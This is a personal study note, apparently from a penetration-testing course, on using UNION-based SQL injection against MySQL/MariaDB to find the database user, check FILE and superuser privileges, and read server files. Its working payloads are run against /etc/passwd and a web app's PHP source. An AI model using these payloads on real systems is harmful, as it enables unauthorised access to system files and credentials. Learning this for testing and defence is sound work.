
***
###### `Title :- Reading Files`
###### `Created on :- 2023-06-17 - 23:47`
###### `Created by:- Prem J`
***

- In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining ***remote code execution*** on the back-end server.

#### `Privilages -->`

- only the privileged users are able to write files to a server, rest of them only perform reading. For example, in `MySQL`, the **DB user** must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files

#### `DB User -->`

- first we need to determine which user we are in the database. 
- While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such.
- If we do have DBA privileges, then it is much more probable that we have file-read privileges
- If we don't have DBA privileges we need to check what kind of user is our current DB user.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

- Above payloads will help in determining the user.

```sql
cn' UNION SELECT 1, user(), 3, 4-- -            Union Injection Payload
3,4,cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

- Which in turn tells us the current user.

![[Pasted image 20230618045533.jpg]]

#### `User Privileges -->`

- Now that we know our user, we can start looking for what privileges we have with that user. We need to check is the user have **super_user** privileges

```sql
SELECT super_priv FROM mysql.user   -- Query to check
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -  payload
```

- if we had many users within DBMS, we cab add `WHERE user="root"` to only show privileges for current user root.

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

![[Pasted image 20230618045903.jpg]]

- The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
```

![[Pasted image 20230618050003.jpg]]

- We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.

#### `LOAD_FILE -->`

- The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name

```sql
SELECT LOAD_FILE('/etc/passwd');
```

>[!Note]
>We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -  #payload
```

![[Pasted image 20230618051353.png]]

#### `Scenario 2 -->`

- In a web application linked with linux the location of the current web page would be somewhere in `/var/www/html`, we could try reading the source code.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

- The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities